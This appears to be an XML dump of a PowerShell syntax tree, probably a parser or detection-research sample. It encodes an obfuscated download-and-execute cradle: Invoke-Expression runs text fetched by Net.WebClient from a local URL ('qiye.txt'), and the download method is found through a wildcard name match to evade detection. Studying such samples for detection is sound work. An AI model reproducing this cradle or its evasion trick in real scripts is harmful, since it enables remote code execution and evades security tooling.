<?xml version="1.0" encoding="utf-8"?>
<ScriptBlockAst>
  <Attributes />
  <UsingStatements />
  <NamedBlockAst>
    <Statements>
      <PipelineAst>
        <PipelineElements>
          <CommandAst>
            <CommandElements>
              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">IEX</StringConstantExpressionAst>
              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
                <Arguments>
                  <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">http://127.0.0.1:8899/qiye.txt</StringConstantExpressionAst>
                </Arguments>
                <MemberExpressionAst Static="False" StaticType="System.Object">
                  <ParenExpressionAst StaticType="System.Object">
                    <PipelineAst>
                      <PipelineElements>
                        <CommandAst>
                          <CommandElements>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Net.WebClient</StringConstantExpressionAst>
                          </CommandElements>
                          <Redirections />
                        </CommandAst>
                      </PipelineElements>
                    </PipelineAst>
                  </ParenExpressionAst>
                  <ParenExpressionAst StaticType="System.Object">
                    <PipelineAst>
                      <PipelineElements>
                        <CommandExpressionAst>
                          <MemberExpressionAst Static="False" StaticType="System.Object">
                            <ParenExpressionAst StaticType="System.Object">
                              <PipelineAst>
                                <PipelineElements>
                                  <CommandExpressionAst>
                                    <MemberExpressionAst Static="False" StaticType="System.Object">
                                      <MemberExpressionAst Static="False" StaticType="System.Object">
                                        <ParenExpressionAst StaticType="System.Object">
                                          <PipelineAst>
                                            <PipelineElements>
                                              <CommandAst>
                                                <CommandElements>
                                                  <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">New-Object</StringConstantExpressionAst>
                                                  <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Net.WebClient</StringConstantExpressionAst>
                                                </CommandElements>
                                                <Redirections />
                                              </CommandAst>
                                            </PipelineElements>
                                          </PipelineAst>
                                        </ParenExpressionAst>
                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">PsObject</StringConstantExpressionAst>
                                      </MemberExpressionAst>
                                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Methods</StringConstantExpressionAst>
                                    </MemberExpressionAst>
                                    <Redirections />
                                  </CommandExpressionAst>
                                  <CommandAst>
                                    <CommandElements>
                                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Where-Object</StringConstantExpressionAst>
                                      <ScriptBlockExpressionAst StaticType="scriptblock">
                                        <ScriptBlockAst>
                                          <Attributes />
                                          <UsingStatements />
                                          <NamedBlockAst>
                                            <Statements>
                                              <PipelineAst>
                                                <PipelineElements>
                                                  <CommandExpressionAst>
                                                    <BinaryExpressionAst Operator="Ilike" StaticType="System.Object">
                                                      <MemberExpressionAst Static="False" StaticType="System.Object">
                                                        <VariableExpressionAst VariablePath="_" StaticType="System.Object" />
                                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Name</StringConstantExpressionAst>
                                                      </MemberExpressionAst>
                                                      <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">*own*d*ing</StringConstantExpressionAst>
                                                    </BinaryExpressionAst>
                                                    <Redirections />
                                                  </CommandExpressionAst>
                                                </PipelineElements>
                                              </PipelineAst>
                                            </Statements>
                                          </NamedBlockAst>
                                        </ScriptBlockAst>
                                      </ScriptBlockExpressionAst>
                                    </CommandElements>
                                    <Redirections />
                                  </CommandAst>
                                </PipelineElements>
                              </PipelineAst>
                            </ParenExpressionAst>
                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Name</StringConstantExpressionAst>
                          </MemberExpressionAst>
                          <Redirections />
                        </CommandExpressionAst>
                      </PipelineElements>
                    </PipelineAst>
                  </ParenExpressionAst>
                </MemberExpressionAst>
                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke</StringConstantExpressionAst>
              </InvokeMemberExpressionAst>
            </CommandElements>
            <Redirections />
          </CommandAst>
        </PipelineElements>
      </PipelineAst>
    </Statements>
  </NamedBlockAst>
</ScriptBlockAst>